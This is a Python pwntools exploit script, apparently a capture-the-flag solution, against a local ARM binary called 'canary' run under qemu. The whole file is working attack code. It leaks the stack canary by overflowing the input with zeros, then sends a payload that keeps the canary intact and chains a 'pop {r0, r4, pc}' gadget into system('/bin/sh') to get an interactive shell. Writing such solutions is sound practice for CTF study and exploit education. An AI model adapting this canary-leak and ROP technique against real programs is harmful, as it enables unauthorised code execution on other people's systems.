from __future__ import print_function
# This exploit is based off of: https://ctftime.org/writeup/12568

from pwn import *

target = process(['qemu-arm', 'canary'])

system = p32(0x16d90)
binsh = p32(0x71eb0)

# pop {r0, r4, pc}
gadget = p32(0x26b7c)

def clearInput():
    print(target.recvuntil('>'))

def leakCanary():
    target.send("0"*41)
    print(target.recvuntil('0'*41))
    leak = target.recv(3)
    canary = u32("\x00" + leak)
    print("Stack canary: " + hex(canary))
    return canary
clearInput()

canary = leakCanary()

payload = ""
payload += "0"*40
payload += p32(canary)
payload += "1"*12
payload += gadget
payload += binsh
payload += "2"*4
payload += system

target.sendline(payload)
target.sendline("")

target.interactive()